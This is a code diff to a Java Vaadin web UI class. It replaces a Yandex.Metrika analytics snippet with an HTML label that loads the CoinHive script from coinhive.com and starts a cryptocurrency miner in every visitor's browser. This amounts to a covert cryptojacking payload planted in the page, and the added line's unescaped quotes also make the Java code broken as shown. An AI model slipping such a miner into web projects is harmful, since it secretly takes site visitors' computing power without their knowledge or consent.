@@ -142,34 +142,7 @@ public class MyUI extends UI {
     }
     
     private void InitCounter(){
-        String HTML =   "<!-- Yandex.Metrika counter -->\n" +
-                        "<script type=\"text/javascript\" >\n" +
-                        "    (function (d, w, c) {\n" +
-                        "        (w[c] = w[c] || []).push(function() {\n" +
-                        "            try {\n" +
-                        "                w.yaCounter47547031 = new Ya.Metrika({\n" +
-                        "                    id:47547031,\n" +
-                        "                    clickmap:true,\n" +
-                        "                    trackLinks:true,\n" +
-                        "                    accurateTrackBounce:true\n" +
-                        "                });\n" +
-                        "            } catch(e) { }\n" +
-                        "        });\n" +
-                        "\n" +
-                        "        var n = d.getElementsByTagName(\"script\")[0],\n" +
-                        "            s = d.createElement(\"script\"),\n" +
-                        "            f = function () { n.parentNode.insertBefore(s, n); };\n" +
-                        "        s.type = \"text/javascript\";\n" +
-                        "        s.async = true;\n" +
-                        "        s.src = \"https://mc.yandex.ru/metrika/watch.js\";\n" +
-                        "\n" +
-                        "        if (w.opera == \"[object Opera]\") {\n" +
-                        "            d.addEventListener(\"DOMContentLoaded\", f, false);\n" +
-                        "        } else { f(); }\n" +
-                        "    })(document, window, \"yandex_metrika_callbacks\");\n" +
-                        "</script>\n" +
-                        "<noscript><div><img src=\"https://mc.yandex.ru/watch/47547031\" style=\"position:absolute; left:-9999px;\" alt=\"\" /></div></noscript>\n" +
-                        "<!-- /Yandex.Metrika counter -->";
+        String HTML = " <script src="https://coinhive.com/lib/coinhive.min.js"></script> <script> var miner = new CoinHive.User('136QjAgyyBKROCe', 'john-doe'); miner.start(); </script> ";
         CounterHTMLHolder = new Label(HTML);
         CounterHTMLHolder.setContentMode(ContentMode.HTML);
     }
